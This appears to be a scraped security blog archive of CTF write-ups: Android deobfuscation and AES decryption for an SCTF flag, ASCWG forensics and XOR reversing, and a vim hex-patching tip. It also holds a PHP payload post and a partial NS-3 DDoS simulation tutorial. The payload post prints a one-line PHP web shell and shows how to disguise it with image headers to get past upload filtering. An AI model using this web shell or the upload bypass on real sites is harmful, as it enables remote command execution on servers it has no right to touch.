StringBuilder(); if (i == 0) { return sb.toString(); } for (int i2 = 0; i2 &lt; charSequence.length(); i2++) { char charAt = charSequence.charAt(i2); char c = (char) (i &gt;&gt; (i2 % 4)); int i3 = i2 % 3; if (i3 == 0) { for (int i4 = 0; i4 &lt; 8; i4 += 2) { char c2 = c(charAt, i4) ^ c(c, i4); if (c2 == 0) { charAt = a(charAt, i4); } else if (c2 == 1) { charAt = b(charAt, i4); } } } else if (i3 == 1) { for (int i5 = 1; i5 &lt; 8; i5 += 2) { char c3 = c(charAt, i5) ^ c(c, i5); if (c3 == 0) { charAt = a(charAt, i5); } else if (c3 == 1) { charAt = b(charAt, i5); } } } else if (i3 == 2) { for (int i6 = 0; i6 &lt; 8; i6++) { char c4 = c(charAt, i6) ^ c(c, i6); if (c4 == 0) { charAt = a(charAt, i6); } else if (c4 == 1) { charAt = b(charAt, i6); }}} sb.append((char) (charAt ^ f823a)); } return sb.toString();}}So this is nice, some code that we can read with human comprehension.Now focus on that XOR part at end of d() : sb.append((char) (charAt ^ f823a));here f823a is local variable whose value is set via VaultApplication.javapackage com.sctf2020.vault101;import android.app.Application;import b.c.a.c;public class VaultApplication extends Application { public void onCreate() { super.onCreate();\\\\ SET VALUE FOR XOR KEY IN c.java c.f823a = 1; }}Okay we as it’s not dynamic so we can skip this class and hardcode the value for f823a in our recreation of this algorithmRecreating the Algo for de-obfuscationI really hope de-obfuscation is valid techinical termSo this is simple and here is my implementation for it:package com.x64mayhem;import javax.crypto.BadPaddingException;import javax.crypto.Cipher;import javax.crypto.IllegalBlockSizeException;import javax.crypto.NoSuchPaddingException;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;import java.io.UnsupportedEncodingException;import java.lang.reflect.Array;import java.security.InvalidAlgorithmParameterException;import java.security.InvalidKeyException;import java.security.NoSuchAlgorithmException;import java.util.Base64;public class Main { public static void main(String[] args) throws IllegalAccessException, UnsupportedEncodingException { //TOOL FOR DECODING INSTRUCTIONS System.out.println( //HERE YOU CAN PUT ANY D() CALL TO DECRYPT IT d(\"&gt;JÂ0ûDwù¯0Õ´zhÝ!ë\\u000ff\", -989022505) );} //WE SET THIS XOR KEY TO 1 AND REMOVE THAT CLASS public static int INTGET=1; public static char a(char c, int i) {return (char) (c &amp; ((1 &lt;&lt; i) ^ 65535));} public static char b(char c, int i) {return (char) (c | (1 &lt;&lt; i));} public static char c(char c, int i) {return (char) ((c &amp; (1 &lt;&lt; i)) &gt;&gt; i);} public static String d(CharSequence charSequence, int i) { StringBuilder sb = new StringBuilder(); if (i == 0) {return sb.toString();} for (int i2 = 0; i2 &lt; charSequence.length(); i2++) { char charAt = charSequence.charAt(i2); char c = (char) (i &gt;&gt; (i2 % 4)); int i3 = i2 % 3; if (i3 == 0) { for (int i4 = 0; i4 &lt; 8; i4 += 2) { char c2 = (char) (c(charAt, i4) ^ c(c, i4)); if (c2 == 0) { charAt = a(charAt, i4); } else if (c2 == 1) { charAt = b(charAt, i4); }} } else if (i3 == 1) { for (int i5 = 1; i5 &lt; 8; i5 += 2) { char c3 = (char) (c(charAt, i5) ^ c(c, i5)); if (c3 == 0) { charAt = a(charAt, i5); } else if (c3 == 1) { charAt = b(charAt, i5); } } } else if (i3 == 2) { for (int i6 = 0; i6 &lt; 8; i6++) { char c4 = (char) (c(charAt, i6) ^ c(c, i6)); if (c4 == 0) { charAt = a(charAt, i6); } else if (c4 == 1) { charAt = b(charAt, i6)}}} sb.append((char) (charAt ^ INTGET));} return sb.toString();}}Now you can try this on your own.The Idea is we will pass the d() call and it will decrypt the gibberish and will give us something valid and it works…Check this out ::Here we can see that the following code in obfuscated app :Object invoke = Class.forName(c.d(\"&gt;JÂ0ûDwù¯0Õ´zhÝ!ë\\u000ff\", -989022505)).getMethod(c.d(\"rî:MGì0BSvn\", -2055632580), new Class[]{Class.forName(c.d(\"+À0­0G¤nò\\r3È6\", 675347394))}).invoke(null, new Object[]{c.d(\"QLÜkh^F,j_È\\u0015%Yî Oukd\", -1263812037)});IS EQUIVALENT TO THIS -&gt;Object invoke = Class.forName(\"javax.crypto.Cipher\").getMethod(\"getInstance\", \tnew Class[]{Class.forName(\"java.lang.String\")}).invoke(null, new Object[]{\"AES/CBC/PKCS5Padding\"});which actually is nothing but this -&gt;Cipher AESCBC = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");So we are getting some code after all huh? NOICE !!So as we are not doing via dynamic approach, we have to decode all the d() calls like this… Don’t worry I will do it for ya, just a sec, till then you can grab some coffee ‘cause next part is actually amusingly simple :)De-Obfuscaton and Code CleaningOkay, so these are the java files after processing :b/c/a/a.javapackage b.c.a;public class a { /* renamed from: a reason: collision with root package name */ public static byte[] f821a; public static byte[] a(byte[] bArr) { //DECRYPT Class&lt;a&gt; cls = a.class; try { Object AESCBC = javax.crypto.Cipher.getInstance, new Class[]{java.lang.String}).invoke(null, new Object[]{AES/CBC/PKCS5Padding}); Object newInstance = javax.crypto.spec.SecretKeySpec(cls.getDeclaredFields()[0].get(null), \"AES\"); Object IvPARAM = javax.crypto.spec.IvParameterSpec(cls.getDeclaredFields()[0].get(null); Object DECRYPT = javax.crypto.Cipher.DECRYPT_MODE.get(null); javax.crypto.Cipher.init(0, java.security.Key, java.security.spec.AlgorithmParameterSpec).invoke(AESCBC, new Object[]{DECRYPT, newInstance, IvPARAM}); return (byte[]) javax.crypto.Cipher.doFinal, new Class[]{Class.forName(\"[B\")}).invoke(AESCBC, new Object[]{bArr}); } catch (Throwable unused) {throw new RuntimeException();} } public static byte[] b(byte[] bArr) { Class&lt;a&gt; cls = a.class; try { Object AESCBC = javax.crypto.Cipher.getInstance, new Class[]{java.lang.String}).invoke(null, new Object[]{AES/CBC/PKCS5Padding}); Object newInstance = javax.crypto.spec.SecretKeySpec.getConstructor(new Class[]{Class.forName(\"[B\"), java.lang.String}).newInstance(new Object[]{cls.getDeclaredFields()[0].get(null), AES}); Object IvPARAM = javax.crypto.spec.IvParameterSpec.getConstructor(new Class[]{Class.forName(\"[B\")}).newInstance(new Object[]{cls.getDeclaredFields()[0].get(null)}); Object ENCRYPT = javax.crypto.Cipher.getDeclaredField(ENCRYPT_MODE.get(null); javax.crypto.Cipher.init, new Class[]{(Class) Integer.TYPE.get(null), java.security.Key, java.security.spec.AlgorithmParameterSpec}).invoke(AESCBC, new Object[]{ENCRYPT, newInstance, IvPARAM}); return (byte[]) javax.crypto.Cipher.doFinal, new Class[]{Class.forName(\"[B\")}).invoke(AESCBC, new Object[]{bArr}); } catch (Throwable unused) {throw new RuntimeException();}}}VaultService.javapackage com.sctf2020.vault101;import android.app.Service;import android.content.Intent;import android.os.IBinder;import b.c.a.c;import java.lang.reflect.Array;public class VaultService extends Service { public IBinder f873b = new b(null); public class b extends b.c.a.b.a { public int f874a; public b(a aVar) {} public boolean a(String str) { try { int i = this.f874a + 1; this.f874a = i; if (i &gt; 3) {java.lang.System.exit(0); return false; } else if (str == null) { return false; } else { byte[] ENCRYPTEDDATAINPUT = b.c.a.a.b((byte[]) java.lang.String.getBytes(str)); Object base64ENCDATA = android.util.Base64.encode(ENCRYPTEDDATAINPUT, android.util.Base64.NO_WRAP); Object OURENCRYPTEDDATA = java.lang.String.(base64ENCDATA) Object MAGIC = android.content.Context.getString, new Class[]{(Class) java.lang.Integer.TYPE.get(null)}).invoke(VaultService.this, new Object[]{Integer.valueOf(R.string.magic)}); return ((Boolean) java.lang.String.equals(MAGIC,OURENCRYPTEDDATA) }} catch (Throwable unused) {throw new RuntimeException();} }} public IBinder onBind(Intent intent) {return this.f873b; public void onCreate() { try { Object invoke = Class.forName(android.content.Context.getResources, null).invoke(this, 0); Object KINDOFMAGIC = String(R.array.kind_of_magic); if (KINDOFMAGIC != null) { int length = Array.getLength(KINDOFMAGIC); byte[] NEWBYTEARRAYKOM = new byte[length]; for (int i = 0; i &lt; length; i++) { Object obj = Array.get(KINDOFMAGIC, i); Object invoke3 = android.util.Base64.decode(obj, android.util.Base64.NO_WRAP); String d = c.d((CharSequence)invoke3, i ^ 137); NEWBYTEARRAYKOM[i] = (byte) (((Character) java.lang.String.charAt,invoke(d, 0)).charValue();)} b.c.a.a.class.getDeclaredFields()[0].set(null, NEWBYTEARRAYKOM); return; }throw new NullPointerException();} catch (Throwable unused) {throw new RuntimeException();}}}Now let’s solve !!ReCreating the AES Encryption and Getting the FlagOk so now we know enough to get the flag. and by analysing all the above codes we can see that application work something like this : Get Input From User Pass that to VaultService.java Encrypt the Input in AES via b/c/a/a.java:b(byte []) byte[] ENCRYPTEDDATAINPUT = b.c.a.a.b((byte[]) java.lang.String.getBytes(str)); Encode in Base64 Object base64ENCDATA = android.util.Base64.encode(ENCRYPTEDDATAINPUT, android.util.Base64.NO_WRAP);Object OURENCRYPTEDDATA = java.lang.String.(base64ENCDATA); Get data from strings.xml with name tag = magic Object MAGIC = android.content.Context.getString, new Class[]{(Class) java.lang.Integer.TYPE.get(null)}).invoke(VaultService.this, new Object[]{Integer.valueOf(R.string.magic)}); Compare the data and return True // False booleanAESThe encryption is actually simple,This code generates the key ://GET STRING ARRAY FROM arrays.xml in values resourceObject KINDOFMAGIC = String(R.array.kind_of_magic);if (KINDOFMAGIC != null) {int length = Array.getLength(KINDOFMAGIC);byte[] NEWBYTEARRAYKOM = new byte[length];for (int i = 0; i &lt; length; i++) {Object obj = Array.get(KINDOFMAGIC, i);//B64 DECODE EACH ELEMENT OF THE ARRAY AND DECRYPT IT USING INBUILD d() FUNCTIONObject invoke3 = android.util.Base64.decode(obj, android.util.Base64.NO_WRAP);//XOR WITH '137' and DECRYPT VIA d()String d = c.d((CharSequence)invoke3, i ^ 137);//APPEND ARRAY TO NEW MEMORYNEWBYTEARRAYKOM[i] = (byte) (((Character) java.lang.String.charAt,invoke(d, 0)).charValue();)}//SET KEY IN THE ENCRYPTION CLASS FROM HEREb.c.a.a.class.getDeclaredFields()[0].set(null, NEWBYTEARRAYKOM);return;I have commented the above code so we don’t have to explain all again here, okay the new thing here is class.getDeclaredFields[0].set() call,this is actually easy, getDeclaredFields will return a list of all declared vars in the class, we select the first one via [0] and then we use set() to change its value. java is actually like programming in drunken English.Now moving on and getting the flag.FLAG !!!So to get the flag we can reverse the process on the saved string and will get it as we have all parameters of encoding and encryption.So here is what I came up with. WE KINDA CREATED WHOLE NEW IMPLEMENTATION OF AES AND DECRYPTION AS SOME OF THE ANDROID KEYWORDS WILL NOT WORK IN GENERAL JAVA.SOLVE.javapackage com.x64mayhem;import javax.crypto.BadPaddingException;import javax.crypto.Cipher;import javax.crypto.IllegalBlockSizeException;import javax.crypto.NoSuchPaddingException;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;import java.io.UnsupportedEncodingException;import java.lang.reflect.Array;import java.security.InvalidAlgorithmParameterException;import java.security.InvalidKeyException;import java.security.NoSuchAlgorithmException;import java.util.Base64;public class Main { public static void main(String[] args) throws IllegalAccessException, UnsupportedEncodingException { String KINDOFMAGIC[]={\"UEBxWw==\", \"Sk5xVcOICw==\", \"bnRX\", \"S0BgWw==\", \"Nw==\", \"R0ZxRMOLElk=\", \"TkJhWw==\", \"dHZHdcOl\", \"eWRNYQ==\", \"bHRSeMOi\", \"R05tVw==\", \"d2hScA==\", \"T0xyVMOADQ==\", \"f2pQ\", \"Q0xsVw==\", \"Nw==\"}; String magic= \"7E3Q5fm4lBSKXaHTnlCO52VL/iY6f+hQQ35oeFphtZIu3pf0QuOEpFB5nTeg8GTx\"; // TO GET THE KEY FROM KINDOFMAGIC ARRAY int length = Array.getLength(KINDOFMAGIC); Base64.Decoder decode=Base64.getDecoder(); byte[] NEWBYTEARRAYKOM = new byte[length]; for (int i = 0; i &lt; length; i++) { Object obj = Array.get(KINDOFMAGIC,i); byte[] invoke3 = decode.decode(obj.toString()); String hmm = d(new String(invoke3,\"UTF-8\"), i ^ 137); NEWBYTEARRAYKOM[i] = ((byte) hmm.charAt(0));} //SET THE KEY IN ENCRYPTION CLASS a.class.getDeclaredFields()[0].set(null, NEWBYTEARRAYKOM); Base64.Decoder decoder=Base64.getDecoder(); byte[] bdecode=decoder.decode(magic); //CALL OUR IMPLEMENTATION OF a.java TO DECRYPT THE DATA byte[] ANSWER =a.a(bdecode); //PRINT FLAG IN UTF-8 STRING System.out.println(new String(ANSWER)); }public static int INTGET=1;public static char a(char c, int i) {return (char) (c &amp; ((1 &lt;&lt; i) ^ 65535));}public static char b(char c, int i) {return (char) (c | (1 &lt;&lt; i));}public static char c(char c, int i) { return (char) ((c &amp; (1 &lt;&lt; i)) &gt;&gt; i);}public static String d(CharSequence charSequence, int i) {StringBuilder sb = new StringBuilder();if (i == 0) {return sb.toString();}for (int i2 = 0; i2 &lt; charSequence.length(); i2++) { char charAt = charSequence.charAt(i2); char c = (char) (i &gt;&gt; (i2 % 4)); int i3 = i2 % 3; if (i3 == 0) { for (int i4 = 0; i4 &lt; 8; i4 += 2) { char c2 = (char) (c(charAt, i4) ^ c(c, i4)); if (c2 == 0) { charAt = a(charAt, i4); } else if (c2 == 1) { charAt = b(charAt, i4);}} } else if (i3 == 1) { for (int i5 = 1; i5 &lt; 8; i5 += 2) { char c3 = (char) (c(charAt, i5) ^ c(c, i5)); if (c3 == 0) { charAt = a(charAt, i5); } else if (c3 == 1) { charAt = b(charAt, i5);}} } else if (i3 == 2) { for (int i6 = 0; i6 &lt; 8; i6++) { char c4 = (char) (c(charAt, i6) ^ c(c, i6)); if (c4 == 0) { charAt = a(charAt, i6); } else if (c4 == 1) { charAt = b(charAt, i6); }}} sb.append((char) (charAt ^ INTGET));}return sb.toString();}}OUR a.javapackage com.x64mayhem;import javax.crypto.BadPaddingException;import javax.crypto.Cipher;import javax.crypto.IllegalBlockSizeException;import javax.crypto.NoSuchPaddingException;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;import java.security.InvalidAlgorithmParameterException;import java.security.InvalidKeyException;import java.security.NoSuchAlgorithmException;public class a { public static byte[] f821a; public static byte[] a(byte[] bArr) { //DECRYPT Class&lt;a&gt; cls = a.class; try { Cipher AESCBC = Cipher.getInstance(\"AES/CBC/PKCS5Padding\"); SecretKeySpec keyspec = new SecretKeySpec((byte[]) cls.getDeclaredFields()[0].get(null), \"AES\"); IvParameterSpec IVSPEC = new IvParameterSpec((byte[]) cls.getDeclaredFields()[0].get(null)); AESCBC.init(Cipher.DECRYPT_MODE, keyspec, IVSPEC); return (byte[]) AESCBC.doFinal(bArr);} catch (NoSuchPaddingException ex) {ex.printStackTrace();}catch (NoSuchAlgorithmException ex) {ex.printStackTrace();}catch (InvalidAlgorithmParameterException ex) {ex.printStackTrace();}catch (InvalidKeyException ex) {ex.printStackTrace();}catch (BadPaddingException ex) {ex.printStackTrace();}catch (IllegalBlockSizeException ex) {ex.printStackTrace();}catch (IllegalAccessException e) {e.printStackTrace();}return null;}}Executing the above code will give us our love of CTFs: SCTF{53CUr17Y_7Hr0U6H_085CUr17Y_15_N07_3N0U6H}PHEW! That’s all for this one.. see ya all in the next one.And you know the drill right? Till then… Stay Caffinenated Enough!" }, { "title": "ASCWG CTF Impossible Dream Writeup", "url": "/blog/posts/ascwg-impossible-dream/", "categories": "CTF, Rev", "tags": "ctf writeup", "date": "2020-08-17 00:00:00 +0530", "snippet": "A writeup of the Forensics Challenge of Arab Security Cyber WarGames.Points : 600The description said :The notorious terrorist group known as the 10 rings got their elite hacker 5 to hack into Stark Industries and steal some sensitive files including the blueprints for the aRC Reactor second model, the hackers messed up the data badly and encrypted the files. Can you retrieve the files?you see some marked text in the challenge? that was not there, we put it there and will break it down later. hold on.First LookSo we got a file that looks like a WAV file. But ofc it was corrupt.So the header fixer guy of our team just fixed the WAV HeaderSee easy. Now what? now we did the following : Played the song Tested in Audacity stegcrack steghide LSB Stegbut none of the above gave any kind of result so we kinda moved on to the different challenges.DeepSound Extractionafter some time we tried to see more WAV file hiding stuff and went with DeepSoundI already had DeepSound installed in my VM. so just fired it up…And oh boy it was there challenge.img, extracted it and transferred it to our host machine for further analysis.Linux File System (Readonly)So it was ext4 Linux disk image.so next step was pretty obviousSo we found some files and only pastebin.txt seems to be readable.The RAR files were password protected and we didn’t have any hint.Encryption and EncodingsInitially, we thought pastebin.txt is a hash as it resembled SHA-256 (RAW) but oh boy we wasted time on that lol.After some time we all again went reading challenge description and noticed some special things in there like : Who names their team-mate 5?Why is RC capital in aRC Reactor?They said hackers encrypted the data5, RC, encrypted ?? DAMN !!!RC5 ENCRYPTED !!!so we fired up online decryption tool soon found out it wasRC2 with key=5so we got a Pastebin link, went there, and saw some text which looks like base32 OR base64 encoding. so again we put that into online decoders.. yes it was but gave some gibberish but again the header fixer guypointed out that it was ROT47 and yes sir it was!We got something like an online tag and our twitter guy said it was twitter ID so we went there and found a tweet.By just seeing the tweet I knew it was substitution cipher and what to expect as the whole structure resembles URL, Caesar maybe.. that damn ape …So fired up another online tool and it was indeed substitution cipher with 13 shiftand gave a mega file service link which had a hash stored in there…and our twitter guy was fast enough and gave us the type of hash MD5 and also the password Password120this can also be done via online services like crack station but I will share hashcat screenshot as it looks cool and I love OG Hash Cracking.Final Mind F***So now we had a password and a rar file but ofc it will not work for 600 points… so we have a non-working password and a rar file.We wasted almost 30 mins on figuring out why the password was not working and what’s wrong with the obvious rar file.and then after we tried everything we started studying all the steps and files we got..and then I noticed something new…Do you see it? these two files show a similar trend of strings …and after some more observation it was clear that this is also A RAR FILE !! but without propper header itself …. time for header fixer guy again XD.so we just patched the RARv5 header in Null …and then we tried to extract this from twitter guy’s password Password120and DONE !! we saw one of the most beautiful messages of that day …and we have the flag .. let me make a new header in this post for that …FLAGAnd here you go :That’s all for this post … see ya in the next one!in the meantime check other writeups from my teammates in our GitHub repo.. FrigidSec GitHubThis chal. had a significant amount of header fixing, so if you are new to this check this article out on how to use vim to edit files in hexadecimal level. Use VIM as HEX editor like a boss" }, { "title": "ASCWG CTF Check Writeup", "url": "/blog/posts/ascwg-check/", "categories": "CTF, Rev", "tags": "ctf writeup", "date": "2020-08-17 00:00:00 +0530", "snippet": "A writeup of Reverse Engineering Challenge of Arab Security Cyber WarGames.Points : 300Just a file check with no description. Who gives a description of reverse challenges anyways?that being said let’s dive into writeup.This was a fairly easy challenge.SolvingFirst, we just did strings but found nothing and will see why that’s the case with this challenge later.Running for the first timeok that being done let’s move to the next part.IDA Static AnalysisJust searching for the strings checking machine... we got our main function.here we can see lots of strings being stored in the stack. okay, let’s trace more…So now we see some new data being loaded to the stack and then passing at arguments to some function…The XOR functionSo the above function is just a xor function which XORs the passed data with a preset key, in our case 87h which can be seen here :yes, I have renamed the variables to make it easy to understand…then the function returns back to main… so let’s follow…XOR minefieldThe whole main function is then followed by the same scheme, Load data XOR with preset keyand all the functions are also simple like above.so let’s keep this in mind and move on…_getenvthis name is enough to understand what this is trying to do…So now you see what it does?Lemme explain… Take DATA XOR with key GET SYSTEM ENVIRONMENT VARIABLE with same decoded name then XOR one more value Check this value with the obtained value from envvar Do this for 2 different env. vars and if they match then show the flag.the flag is loaded as a chunk of data at the start, and yes it’s also XORed with 92h as key.Get the flag.so there are now three ways to get the flag. Decode the env. var and values and then run the binary Decode flag directly from the stack JUST DO BINARY PATCHING AND CHANGE LAST 2 if statement to change the program flowDecode everythin’ XORmayhemHere is a small python script to do what program is doingenv1a=[0xd3,0xd4,0xc8,0xcf]env1a.reverse()env1b=[0xc2,0xca,0xc6,0xc9]env1b.reverse()env1=env1a+env1benv2=[0xc3,0xd4,0xc2,0xc4]env2.reverse()envvar1valueA=[0xfe,0xf5,0xf7,0xdb]envvar1valueA.reverse()envvar1valueB=[0xf3,0xf8,0xff]envvar1valueB.reverse()envvar1value=envvar1valueA+envvar1valueBenvvar2valueA=[0xf7,0xfc,0xfc,0xeb]envvar2valueA.reverse()envvar2valueB=[0xfc,0xf7,0xfe,0xf0]envvar2valueB.reverse()envvar2value=envvar2valueA+envvar2valueBflagA=[0xd6,0xdc,0xc4,0xc3]flagB=[0xa5,0xf6,0xa2,0xc4]flagC=[0xa0,0xa7,0xa0,0xdf]flagD=[0xa2,0xcb,0xa1,0xca]flagE=[0xf4,0xc4,0xf8,0xf1]flagF=[0xe8,0xdb,0xda,0xdc]flagG=[0xa3,0xc7,0xa1,0xca]flagH=[0xa3,0xc8,0xa0,0xdf]flagI=[0xaf,0xa2,0xda,0xf0]flagA.reverse()flagB.reverse()flagC.reverse()flagD.reverse()flagE.reverse()flagF.reverse()flagG.reverse()flagH.reverse()flagI.reverse()flag=flagA+flagB+flagC+flagD+flagE+flagF+flagG+flagH+flagIprint(\"envVar1 = \",end=' ')for i in env1: print(chr(int(i)^int('87',base=16)),end=\"\")print()print(\"envVar1 Value = \",end=' ')for i in envvar1value: print(chr(int(i)^int('96',base=16)),end=\"\")print()print(\"envVar2 = \",end=' ')for i in env2: print(chr(int(i)^int('91',base=16)),end=\"\") print()print(\"envVar2 Value = \",end=' ')for i in envvar2value: print(chr(int(i)^int('99',base=16)),end=\"\")print()print(\"flag = \",end=' ')for i in flag: print(chr(int(i)^int('92',base=16)),end=\"\")print()The above script will give you all the environment variables and the flag too as it is also XORed lol…and then just export these values in the env. vars to get the flag.My FAV binary patching ! (solve in 5 min)Just see this …74 -&gt; 75 i.e. JZ -&gt; JNZ just do this in two places and the program will give you all its secrets without any pain…Binary patching can be intimidating for some… check these articles out for some idea and how to do it at a basic level as you should be good to go for this one. :)Use VIM as HEX editor like a bossTaking over the software by Instruction Rewriting.ConclusionSo we have the flag in base64 format, by any of the above methods.we just need to decode it and it’s pretty easy with is neat pipe trick:echo \"QVNDV0d7M252X3Y0cjVfNHIzX3U1M2Z1bH0=\" | base64 -d -This will give the flagASCWG{3nv_v4r5_4r3_u53ful}" }, { "title": "Use VIM as HEX editor like a boss", "url": "/blog/posts/use-VIM-as-HEX-Editor/", "categories": "Misc.", "tags": "ctf, vim, hex", "date": "2020-08-16 00:00:00 +0530", "snippet": "VIM's already OP. Here's how to do more.VIM in itself is a pretty powerful text editor, and the fact we can integrate this with other programs and scripts makes it stronger.In this article, I want to share one such trick I learned recently to combine vim and xxd to edit a file at hex level.This actually helps a lot in situations where we want a quick fix to something, let it be minor binary patching or some file header repair.xxdxxd creates a hex dump of a given file or standard input. It can also convert a hex dump back to its original binary form. Like, uuencode and uudecode(1) it allows the transmission of binary data in a ‘mail-safe’ ASCII representation but has the advantage of decoding to standard output.Moreover, it can be used to perform binary file patching.xxd &lt;filename&gt; will give us hex dump of the file and xxd -r &lt;hexdump&gt; will resurrect the file back from hexdump and these are the two properties we will use with vim to edit the file in vim in its hex rep.How to? In this we will use the executable file with name executableyou can change this to your target fileOpen the file in vimvim executableExecute xxd in vimin the vim command type,: %!xxdthis will convert the file to the hex rep.Search for specific hex patternSearching is same as regular vim usage, pattern preceded by //837d fc00 752aHere I am searching for 752a opcode which I want to patch in this case, in short, 75 = JNE and 74 = JE so this will change the flow of control in the application.to know more about this check my Taking over the software by Instruction Rewriting. article.Now as we have the pattern we can just change the opcode 75 to 74Reverse the HEX-dump into the binary fileagain in vim command, type,:%!xxd -rthis will convert it back to binarySave, Exit and you’re done.:wqis all it takes to complete the process.ConclusionWe have edited the file at the hex level!here is the quick check for the above executable, the file was ELF x64 executable duh! hence the name :-)The first execution is before patching and the second is after the patch…Well, at this point the article is over but if you are curious about what we exactly did above here it is …we compiled this program :#include&lt;iostream&gt;using namespace std;int main()\t{\t\tint x=0;\t\tif(x == 0){\t\t\tstd::cout&lt;&lt;\"zero\"&lt;&lt;std::endl;\t\t}\t\telse{\t\t\tstd::cout&lt;&lt;\"not zero\"&lt;&lt;std::endl;\t\t}\t\treturn 0;\t}And then patched the if statement by patching 75 opcode to 74in simple term converting if(x == 0) to if(x != 0) statement.But as it said earlier, check out Taking over the software by Instruction Rewriting. article.See ya in the next one!" }, { "title": "Custom Signature PHP Payloads", "url": "/blog/posts/Custom-Signature-PHP-Payloads/", "categories": "Security", "tags": "ctf, payloads", "date": "2020-08-15 00:00:00 +0530", "snippet": "Easily generating PHP Payloads with Custom file signatures to bypass input sanitizationWhat is this? A tip on bypassing input sanitation by changing the payload signature.This process is generally done in packet analyzer or proxy application like burp but this can be done easily without that.We will look into two basic ways to achieve this.Why this works?PHP generally start interpreting the script wherever &lt;?php tag starts so anything gibberish preceding that will not be executed and that’s good news for us as we can now append the payload after some file descriptors so that metadata of the file will show whatever we want it to show but it will still be a valid PHP script.MethodsPython scriptDon’t worry I have done the hard work for you, you just need to prepare your payload, we will put the burden of signature management to a script.Actually this is a small project where I am collecting some of the commonly used file signatures from real files (not the internet and file format wikis) this should give all the payload more convincing results.You can get the project from GitHub HEREWith custom python scriptAs simple aspython cupps.py -s pngthis will create PHP payload &lt;?php system($_GET['cmd']);?&gt; with PNG signature. this is one of the commonly known tricks to bypass most of the basic image upload scenarios.All the available signatures can be seen by the -h parameter.$ python cupps.py -husage: cupps.py [-h] [-s target_signature]Script to create PHP Payloads with custom file signaturesoptional arguments: -h, --help show this help message and exit -s target_signature, --signature target_signature accepted inputs : png,jpg,exe,elf,gif,bmp,jar,pdf,iso~ with &lt;3 by X64M NOTE: This is an active project as of 15-08-2020 and I am trying to add more signatures to it so feel free to contribute.By appending output of catThis is one of the neat tricks to achieve this.just do this :cat image.png | head -n 3 &gt;&gt;exploit.php.pngthis will take the image header and will write to the file exploit.php.pngand thencat payload.php &gt;&gt;exploit.php.pngThis will append the payload to the file with an existing image header.And that would just do it.ConclusionWell, that’s it for this article. See ya in the next one!Till then stay caffeinated enough!–" }, { "title": "DDoS attack Simulation in NS3", "url": "/blog/posts/DDoS-Simulation-in-NS3-C++/", "categories": "Security", "tags": "simulation, ns3", "date": "2020-08-10 00:00:00 +0530", "snippet": "Distributed Denial of Service Attack Simuation Build from scratch in C++This article is about coding a Distributed Denial of Service Attack simulation in NS-3 discrete event network simulator.Why do we need it?Because visual representation of basic concepts which you can play around with is better right?Where can you get the code?As part of a community project I am collecting / building multiple cybersecurity simulations and scenarios in NS3 and logging them in GitHub.You can check the repo fromPROJECTS section of this site.How to ?Now this is what this article is all about. Let’s jump into it.Creating Base ModelThe base model for this attack is relatively simple : We have 3 main nodes Alice [n0] (Legitimate Client), Bob [ n2] (Server Application) and a connecting node in between let’s say Dave [n1].(“Legitimate Connection Model”)Now we will add as many bots we want to attack the network and let’s call them Mallory [bi | i∈ (N)].Code [C++]Let’s first include all the required headers.#include &lt;ns3/csma-helper.h&gt;#include \"ns3/mobility-module.h\"#include \"ns3/nstime.h\"#include \"ns3/core-module.h\"#include \"ns3/network-module.h\"#include \"ns3/internet-module.h\"#include \"ns3/point-to-point-module.h\"#include \"ns3/applications-module.h\"#include \"ns3/ipv4-global-routing-helper.h\"#include \"ns3/netanim-module.h\"next we define some global configurations so that we can play around with them later.#define TCP_SINK_PORT 9000#define UDP_SINK_PORT 9001//experimental parameters#define MAX_BULK_BYTES 100000#define DDOS_RATE \"20480kb/s\"#define MAX_SIMULATION_TIME 10.0//Number of Bots for DDoS#define NUMBER_OF_BOTS 10NS_LOG_COMPONENT_DEFINE(\"DDoSAttack\");using namespace ns3;Now inside typical main() function we will start creating our base model.Creating NodesNodes are nothing but the points of communication we structured in our design phase.This will create 3 good nodes and as many Bot nodes defined by NUMBER_OF_BOTS.//Legitimate connection botsNodeContainer nodes;nodes.Create(3);//Nodes for attack botsNodeContainer botNodes;botNodes.Create(NUMBER_OF_BOTS);Connecting NodesWe can use point-to-point helper to connect different nodes.// Define the Point-To-Point Links and their ParamtersPointToPointHelper pp1, pp2;pp1.SetDeviceAttribute(\"DataRate\", StringValue(\"100Mbps\"));pp1.SetChannelAttribute(\"Delay\", StringValue(\"1ms\"));pp2.SetDeviceAttribute(\"DataRate\", StringValue(\"100Mbps\"));pp2.SetChannelAttribute(\"Delay\", StringValue(\"1ms\"));and then install the P2P device in the nodes to actually connect them. One thing to keep in mind here is that our number of bots are dynamic and we don’t want the user to change the whole algorithm when changing the number so we can use simple for loop for P2P installation in the bots.We will use these “for-loops” wherever we will assign or install something to bot nodes.NetDeviceContainer d02, d12, botDeviceContainer[NUMBER_OF_BOTS];d02 = pp1.Install(nodes.Get(0), nodes.Get(1));d12 = pp1.Install(nodes.Get(1), nodes.Get(2));for (int i = 0; i &lt; NUMBER_OF_BOTS; ++i){ botDeviceContainer[i] = pp2.Install(botNodes.Get(i), nodes.Get(1));}Assignment of IP Address and Internet StackIn this case we are using IPv4 Address for our nodes and can be setup by ipv4-helper class. This will connect our devices to virtual internet stack.//Assign IP to botsInternetStackHelper stack;stack.Install(nodes);stack.Install(botNodes);Ipv4AddressHelper ipv4_n;ipv4_n.SetBase(\"10.0.0.0\", \"255.255.255.252\");Ipv4AddressHelper a02, a12, a23, a34;a02.SetBase(\"10.1.1.0\", \"255.255.255.0\");a12.SetBase(\"10.1.2.0\", \"255.255.255.0\");for (int j = 0; j &lt; NUMBER_OF_BOTS; ++j){ ipv4_n.Assign(botDeviceContainer[j]); ipv4_n.NewNetwork();}//Assign IP to legitimate nodesIpv4InterfaceContainer i02, i12;i02 = a02.Assign(d02);i12 = a12.Assign(d12);Installing Attacker Application in the botsNow we want to install applications in our nodes so that they can communicate with their neighbors. Let’s create attacker application.The attacker application in this case is simple UDP OnOff Sender which can be created by :// DDoS Application BehaviourOnOffHelper onoff(\"ns3::UdpSocketFactory\", Address(InetSocketAddress(i12.GetAddress(1), UDP_SINK_PORT)));onoff.SetConstantRate(DataRate(DDOS_RATE));onoff.SetAttribute(\"OnTime\", StringValue(\"ns3::ConstantRandomVariable[Constant=30]\"));onoff.SetAttribute(\"OffTime\", StringValue(\"ns3::ConstantRandomVariable[Constant=0]\"));ApplicationContainer 